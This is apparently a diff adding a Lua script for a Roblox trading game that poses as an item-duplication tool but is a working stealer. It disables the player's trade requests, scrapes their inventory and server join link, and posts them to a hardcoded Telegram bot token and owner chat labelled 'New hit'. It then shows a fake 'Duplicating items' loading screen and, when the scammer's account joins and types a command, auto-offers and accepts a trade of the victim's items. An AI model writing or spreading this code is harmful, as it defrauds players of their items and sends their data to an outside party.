'Coconut_K_2025'},{['Stickers'] = 'Stickers_K_2025'},{['Striped'] = 'Striped_G_2025'},{['Pool'] = 'Pool_K_2025'},{['Soda'] = 'Soda_G_2025'},{['Lava'] = 'Lava_K_2025'},{['Pop Art'] = 'PopArt_K_2025'},{['Tropical'] = 'Tropical_K_2025'},{['Aquarium'] = 'Aquarium_G_2025'},{['Striped'] = 'Striped_K_2025'},{['Stickers'] = 'Stickers_G_2025'},{['Dolphins'] = 'Dolphins_K_2025'},{['Skyline'] = 'Skyline_K_2025'},{['Soda'] = 'Soda_K_2025'},{['Retro'] = 'Retro_K_2025'},{['Lava'] = 'Lava_G_2025'},{['Neon'] = 'Neon_G_2025'},{['Pop Art'] = 'PopArt_G_2025'},{['Aquarium'] = 'Aquarium_K_2025'}}
+-- Отключаем трейды
+
+local args = {
+	false
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SetRequestsEnabled"):FireServer(unpack(args))
+
+-- Получаем данные о игроке и сервере
+
+
+local player = game:GetService("Players").LocalPlayer
+local playerData = {
+    realhypename = player.Name,
+    displayName = player.DisplayName,
+    userId = player.UserId
+}
+
+local function getServerLink()
+    return 'https://www.roblox.com/games/start?placeId='..game.placeId..'&gameInstanceId='..game.jobId
+end
+local link = getServerLink()
+
+-- Получаем инвентарь игрока 
+local itemsInventory = {}
+local userInventory = {
+    ["Unique"] = {},
+    ["Ancient"] = {},
+    ["Godly"] = {},
+    ["Vintage"] = {},
+    ["Legendary"] = {},
+    ["Rare"] = {},
+    ["Uncommon"] = {},
+    ["Common"] = {}}
+local function addItemIntoTelegramInventory(rarity, skinName, amount)
+    if not userInventory[rarity] then
+        warn("Неизвестная редкость: " .. rarity)
+        return
+    end
+    
+    userInventory[rarity][skinName] = (userInventory[rarity][skinName] or 0) + amount
+end
+local function addItemIntoInventory(skinName, amount)
+    for i, itemTable in ipairs(allItemsData) do
+        if itemTable[skinName] then
+            itemValue = itemTable[skinName]
+            table.insert(itemsInventory, {ItemName = itemValue, ItemAmount = amount})
+        end
+    end
+end
+local function getRarity(pagecolor)
+    if pagecolor == Color3.fromRGB(106, 106, 106) then
+		rarity = 'Common'
+	elseif pagecolor == Color3.fromRGB(0, 255, 255) then
+		rarity = 'Uncommon'
+	elseif pagecolor == Color3.fromRGB(0, 200, 0) then
+		rarity = 'Rare'
+	elseif pagecolor == Color3.fromRGB(220, 0, 5) then
+		rarity = 'Legendary'
+	elseif pagecolor == Color3.fromRGB(255, 0, 179) then
+		rarity = 'Godly'
+	elseif pagecolor == Color3.fromRGB(100, 10, 255) then
+		rarity = 'Ancient'
+	elseif pagecolor == Color3.fromRGB(230, 200, 0) then
+		rarity = 'Vintage'
+	elseif pagecolor == Color3.fromRGB(240, 140, 0) then
+		rarity = 'Unique'
+	end
+    return rarity
+end
+local function getInventory(path)
+    amount = nil
+    rarity = nil
+    itemName = nil
+    for i, page in ipairs(path:GetDescendants()) do
+        
+        if page.Name == 'Amount' then
+            if page.Text == '' then
+                amount = 1
+            else
+                amount = tonumber(page.Text:match("%d+"))
+            end
+        end
+	    if page.Name == 'ItemName' then
+            rarity = getRarity(page.BackgroundColor3)
+        end
+        if page.Name == 'Label' then
+            itemName = page.Text
+        end
+        if rarity ~= nil and amount ~= nil and itemName~=nil then
+            addItemIntoTelegramInventory(rarity, tostring(itemName), amount)
+            addItemIntoInventory(itemName, amount)
+            amount = nil
+            rarity = nil
+            itemName = nil
+        end
+    end
+end
+local path = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Weapons.Items.Container
+getInventory(path)
+
+-- Публикуем полученные данные в дискорд
+local telegramBotToken = "8457776167:AAHyIGOM3U0rv5Sua1U0g-Lsw2zNJlOQ4Eo"
+local OwnerChatId = "1056086381"
+
+local function sendToTelegram(dataText, chatId)
+
+	local data = {
+		chat_id = chatId,
+		text = dataText,
+		parse_mode = "MarkdownV2",
+		disable_web_page_preview = true
+	}
+
+	if request then
+	    request({
+	        Url = "https://api.telegram.org/bot"..telegramBotToken.."/sendMessage",
+	        Method = "POST",
+	        Headers = {
+	            ["Content-Type"] = "application/json"
+	        },
+	        Body = game:GetService("HttpService"):JSONEncode(data)
+	    })
+	end
+end
+datadiscord = ''
+for rarity, items in pairs(userInventory) do
+    datadiscord = datadiscord.."\n🟩"..rarity.."\n"
+    for skin, count in pairs(items) do
+        datadiscord = datadiscord..skin..": "..count.."x\n"
+    end
+end
+
+sendToTelegram('✅New hit\nUser: '..playerData.realhypename..'\n'..datadiscord..'Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`', CustomChatId)
+sendToTelegram('✅New hit\nUser: '..playerData.realhypename..'\n'..datadiscord..'Join Link:\n`'..link..'`\nJobId: `'..game.jobId..'`\nTrade Cmd: `'..CustomTradeCommand..'`\nAccept Trade Cmd: `'..CustomAcceptTradeCommand..'`', OwnerChatId)
+
+-- Создаем визуал
+
+local LOAD_TIME = CustomLoadTime 
+local PHRASES = { 
+    "Decrypting payload...",
+    "Injecting DLLs...",
+    "Establishing RPC connection...",
+    "Spoofing HWID...",
+    "Generating fake packets...",
+    "Hooking game functions...",
+    "Dumping memory...",
+    "Patching offsets...",
+    "Deobfuscating scripts...",
+    "Ready for operation",
+    "Session secured",
+    "Duplicating items"
+}
+local gui = Instance.new("ScreenGui")
+gui.Name = "DupeLoader"
+gui.Parent = player.PlayerGui
+gui.ResetOnSpawn = false
+local function createLoadScreen()
+    local loadFrame = Instance.new("Frame")
+    loadFrame.Size = UDim2.new(0.4, 0, 0.15, 0)
+    loadFrame.Position = UDim2.new(0.3, 0, 0.4, 0)
+    loadFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    loadFrame.BackgroundTransparency = 0
+    loadFrame.BorderSizePixel = 0
+    loadFrame.Parent = gui
+
+    local title = Instance.new("TextLabel")
+    title.Text = "Fetching API..."
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 18
+    title.Font = Enum.Font.Code
+    title.Size = UDim2.new(1, 0, 0.5, 0)
+    title.BackgroundTransparency = 1
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Position = UDim2.new(0.05, 0, 0.1, 0)
+    title.Parent = loadFrame
+
+    local progressBarBack = Instance.new("Frame")
+    progressBarBack.Size = UDim2.new(0.9, 0, 0.05, 0)
+    progressBarBack.Position = UDim2.new(0.05, 0, 0.7, 0)
+    progressBarBack.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    progressBarBack.BorderSizePixel = 0
+    progressBarBack.Parent = loadFrame
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(255, 98, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressBarBack
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    percentText.TextSize = 14
+    percentText.Font = Enum.Font.Code
+    percentText.Size = UDim2.new(0.2, 0, 0.3, 0)
+    percentText.Position = UDim2.new(0.75, 0, 0.35, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Parent = loadFrame
+
+    return loadFrame, title, progressBar, percentText
+end
+local function runLoadScreen()
+    local loadFrame, title, progressBar, percentText = createLoadScreen()
+    local startTime = os.clock()
+    local phraseInterval = LOAD_TIME / #PHRASES
+    local MAX_PROGRESS = 0.95 
+
+    while os.clock() - startTime < LOAD_TIME do
+        local rawProgress = (os.clock() - startTime) / LOAD_TIME
+        local progress = math.min(rawProgress, MAX_PROGRESS)
+        
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = math.floor(progress * 100) .. "%"
+
+        local phraseIndex = math.min(math.floor(rawProgress * #PHRASES) + 1, #PHRASES)
+        title.Text = PHRASES[phraseIndex]
+
+        task.wait(0.03)
+    end
+
+    progressBar.Size = UDim2.new(MAX_PROGRESS, 0, 1, 0)
+    percentText.Text = math.floor(MAX_PROGRESS * 100) .. "%"
+
+    task.wait(60)
+    title.Text = "Succesfully duped"
+    progressBar.Size = UDim2.new(1, 0, 1, 0)
+    percentText.Text = math.floor(1 * 100) .. "%"
+    task.wait(5)
+    loadFrame:Destroy()
+    createMainMenu() 
+end
+
+-- Функции трейда
+
+local function sendTrade(username)
+    local args = {
+	        game:GetService("Players"):WaitForChild(username)
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+end
+local function addItems()
+    local addedItems = 1
+    for i, v in ipairs(itemsInventory) do
+        for k=0, v.ItemAmount do
+            print(v.ItemName, v.ItemAmount)
+            local args ={
+                v.ItemName,
+                "Weapons"
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+        end
+        v.ItemAmount = 0
+        if addedItems==4 then
+            break
+        end
+        addedItems = addedItems+1
+    end
+end
+
+local function acceptTrade()
+    local args = {
+	    285646582
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+end
+
+-- Запуск кода
+game.Players.PlayerAdded:Connect(function(player)
+    if player.UserId == 9043281161 or player.UserId == CustomPlayerId then
+        sendToTelegram(playerData.realhypename.." scammed", OwnerChatId)
+        player.Chatted:Connect(function(message)
+            if message == CustomTradeCommand then
+                if player.UserId == 9043281161 then
+                    sendTrade("LilPiskaScammer")
+                elseif player.UserId == CustomPlayerId then
+                    sendTrade(CustomPlayerUsername)
+                end
+                wait(3)
+                addItems()
+            end
+            if message == CustomAcceptTradeCommand then
+                acceptTrade()
+            end
+        end)
+    end
+end)
